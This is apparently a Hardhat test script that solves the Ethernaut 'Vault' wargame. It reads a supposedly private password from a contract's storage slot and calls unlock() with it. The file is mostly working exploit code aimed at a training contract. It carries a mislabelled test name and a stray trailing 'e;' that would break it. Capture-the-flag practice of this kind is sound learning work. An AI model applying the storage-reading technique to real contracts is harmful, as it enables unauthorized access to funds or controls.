const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Delegation Exploit using EOA", function () {
  let vaultContract, attacker, contractAddress, isLocked;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x5225968E636a608B911B384107E540972A07381A"; // insert contract address of ethernaut challenge
    vaultContract = await ethers.getContractAt("Vault", contractAddress);
  });

  it("perform exploit", async function () {
    // Attack flow
    // 1) Lets grab the bytes32 value at slot 0 -> we should see a value of 1(represents true)
    let vaultContractSlot0 = await ethers.provider.getStorageAt(
      contractAddress,
      0
    );

    console.log("The vault Contract value at slot 0 is: ", vaultContractSlot0);

    // 2) Grab the bytes32 value at slot 1 -> we should see a much longer value represented by bytes (0x48656c6c6f2c20776f726c6421000000000000000000000000000000000000)

    let vaultContractSlot1 = await ethers.provider.getStorageAt(
      contractAddress,
      1
    );
    console.log("The vault contract value at slot 1 is: ", vaultContractSlot1);

    // bonus - attempt to view the bytes32 as a string (incorrect for now - anyone know how to view this as a string)

    const stringData = ethers.utils.toUtf8String(
      ethers.BigNumber.from(vaultContractSlot1)
    );

    console.log("The storage slot data at slot 1 is ", stringData);

    // 3) Call the vaultContract.unlock(slot1 bytes32) -> that should unlock the vault

    let txUnlock = await vaultContract.unlock(vaultContractSlot1);

    console.log("The txUnlock is ", txUnlock);

    let receiptTxUnlock = await txUnlock.wait();

    console.log("The receipt for txUnlock is", receiptTxUnlock);

    // 4) Grab the locked value of the vault contract

    isLocked = await vaultContract.locked();

    console.log(`The vault is currently ${isLocked}`);
  });

  after("confirm exploit", async function () {
    // 5) confirm that unlocked is false
    expect(isLocked).to.be.false;
  });
});
e;
